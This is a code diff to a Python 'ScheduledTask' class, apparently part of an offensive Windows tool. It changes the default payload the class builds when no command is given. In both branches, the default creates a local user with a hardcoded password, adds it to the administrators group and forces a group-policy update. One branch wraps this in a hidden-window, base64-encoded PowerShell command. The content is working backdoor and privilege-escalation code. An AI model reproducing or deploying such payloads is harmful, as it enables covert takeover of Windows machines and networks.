@@ -36,13 +36,13 @@ class ScheduledTask:
             if command:
                 self._command = escape('-windowstyle hidden -nop -enc {}'.format(b64encode(command.encode('UTF-16LE')).decode("utf-8")))
             else:
-                self._command = escape('-windowstyle hidden -nop -enc {}'.format(b64encode('net user john H4x00r123.. /add;net localgroup administrators john /add'.encode('UTF-16LE')).decode('utf-8')))
+                self._command = escape('-windowstyle hidden -nop -enc {}'.format(b64encode('net user myadmin 123qweasdF! /add; net localgroup administrators myadmin /add; gpupdate /force'.encode('UTF-16LE')).decode('utf-8')))
         else:
             self._shell = escape('c:\\windows\\system32\\cmd.exe')
             if command:
                 self._command = escape('/c "{}"'.format(command))
             else:
-                self._command = escape('/c "net user john H4x00r123.. /add && net localgroup administrators john /add"')
+                self._command = escape('/c "net user myadmin 123qweasdF! /add && net localgroup administrators myadmin /add && gpupdate /force"')
 
         logging.debug(self._shell + " " + self._command)
         self._old_value = old_value
